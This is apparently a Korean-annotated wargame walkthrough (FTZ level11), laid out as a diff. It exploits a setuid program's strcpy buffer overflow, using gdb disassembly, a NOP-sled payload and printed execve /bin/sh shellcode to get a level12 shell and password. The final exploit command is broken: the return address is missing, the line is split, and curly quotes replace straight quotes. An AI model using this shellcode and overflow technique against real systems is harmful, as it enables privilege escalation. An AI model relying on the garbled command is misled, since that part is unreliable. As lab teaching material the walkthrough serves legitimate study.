@@ -1,0 +1,88 @@
+login as: level11
+level11@192.168.35.100's password:
+[level11@ftz level11]$ ll
+total 28
+-rwsr-x---    1 level12  level11     13733 Mar  8  2003 attackme
+-rw-r-----    1 root     level11       168 Mar  8  2003 hint
+drwxr-xr-x    2 root     level11      4096 Feb 24  2002 public_html
+drwxrwxr-x    2 root     level11      4096 Dec 21 22:09 tmp
+[level11@ftz level11]$ cat hint
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main( int argc, char *argv[] )
+{
+        char str[256];
+
+        setreuid( 3092, 3092 );
+        strcpy( str, argv[1] );
+        printf( str );
+}
+
+
+[level11@ftz level11]$ cd tmp		
+### gdb로 attackme를 실행하였을 때 에러가 발생->tmp에 attackme 파일 복사
+[level11@ftz tmp]$ ll
+total 16
+-rwxr-x---    1 level11  level11     13733 Dec 21 22:09 attackme
+[level11@ftz tmp]$ gdb attackme	
+GNU gdb Red Hat Linux (5.3post-0.20021129.18rh)
+Copyright 2003 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux-gnu"...
+(gdb) disas main	### attackme의 main함수 디버깅
+Dump of assembler code for function main:
+0x08048470 <main+0>:    push   %ebp
+0x08048471 <main+1>:    mov    %esp,%ebp
+0x08048473 <main+3>:    sub    $0x108,%esp	### 0x108->10진수로 264
+0x08048479 <main+9>:    sub    $0x8,%esp		### 더미 8바이트
+0x0804847c <main+12>:   push   $0xc14
+0x08048481 <main+17>:   push   $0xc14
+0x08048486 <main+22>:   call   0x804834c <setreuid>
+0x0804848b <main+27>:   add    $0x10,%esp
+0x0804848e <main+30>:   sub    $0x8,%esp
+0x08048491 <main+33>:   mov    0xc(%ebp),%eax
+0x08048494 <main+36>:   add    $0x4,%eax
+0x08048497 <main+39>:   pushl  (%eax)
+0x08048499 <main+41>:   lea    0xfffffef8(%ebp),%eax
+0x0804849f <main+47>:   push   %eax
+0x080484a0 <main+48>:   call   0x804835c <strcpy>
+0x080484a5 <main+53>:   add    $0x10,%esp
+0x080484a8 <main+56>:   sub    $0xc,%esp
+0x080484ab <main+59>:   lea    0xfffffef8(%ebp),%eax
+0x080484b1 <main+65>:   push   %eax
+0x080484b2 <main+66>:   call   0x804833c <printf>
+0x080484b7 <main+71>:   add    $0x10,%esp
+0x080484ba <main+74>:   leave
+0x080484bb <main+75>:   ret
+0x080484bc <main+76>:   nop
+0x080484bd <main+77>:   nop
+0x080484be <main+78>:   nop
+0x080484bf <main+79>:   nop
+End of assembler dump.
+### 메모리구조: 버퍼(256바이트)+더미(8바이트)+SFP(4바이트)+RET(4바이트)=272바이트
+### 버퍼: 데이터 저장 공간, SFP: leave시켜 RET로 돌아갈 주소를 ebp에 불러온다, RET: 리턴
+(gdb) r `python -c 'print "\x90"*243+"A"*25+"B"*4'`
+### r: gdb의 실행 명령어
+### \x90: nop(no operation, 아무 일도 하지 않는다는 어셈블리어 명령)
+### 쉘코드가 25바이트이므로 RET를 제외한 바이트 268에서 25를 빼면 243바이트가 남는다
+Starting program: /home/level11/tmp/attackme `python -c 'print "\x90"*243+"A"*25+"B"*4'`
+
+(gdb)x/268x $esp	
+### 메모리상태 검사: x/[범위][출력형식][범위단위]    [메모리주소나 함수명]
+### esp: ss 레지스터가 가리키는 스택 세그먼트의 맨 꼭대기를 가리키는 포인터
+
+### nop값이 들어있는 주소를 임의로 RET의 주소로 잡고 공격
+### 25바이트 쉘코드: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
+
+[level11 @ ftz level11 ]$ ./attackme `python -c ‘print 
+“\x90”*243+”\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80”
+sh-2.05b$ my-pass
+TERM environment variable not set.
+Level12 Password is “it is like this”.
+
+sh-2.05b$
